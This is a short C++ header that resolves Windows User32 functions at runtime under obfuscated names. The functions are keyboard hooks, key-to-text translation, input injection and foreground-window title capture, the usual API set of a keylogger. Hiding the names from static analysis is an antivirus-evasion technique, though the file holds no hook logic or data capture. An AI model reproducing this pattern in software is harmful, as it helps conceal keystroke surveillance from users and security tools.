#pragma once

#include "DllHelper.h"
#include <tchar.h>
#include "obfuscate.h"

class User32
{
	DllHelper _dll{ _T("User32.dll") };

#define addr(name) \
	_dll[(char *)OBFUSCATE(name)]

public:
	decltype(MapVirtualKeyEx)	* MapVirtualKeyEx	= addr("MapVirtualKeyExW");
	decltype(ToUnicodeEx)		* ToUnicodeEx		= addr("ToUnicodeEx");
	decltype(GetKeyState)		* GetKeyState		= addr("GetKeyState");
	decltype(SetWindowsHookEx)	* SetWindowsHookEx	= addr("SetWindowsHookExW");
	decltype(CallNextHookEx)	* CallNextHookEx	= addr("CallNextHookEx");
	decltype(SetWinEventHook)	* SetWinEventHook	= addr("SetWinEventHook");
	decltype(SendInput)			* SendInput			= addr("SendInput");

	decltype(GetWindowText)* GetWindowText = addr("GetWindowTextW");
	decltype(GetForegroundWindow)* GetForegroundWindow = addr("GetForegroundWindow");

#undef addr
};

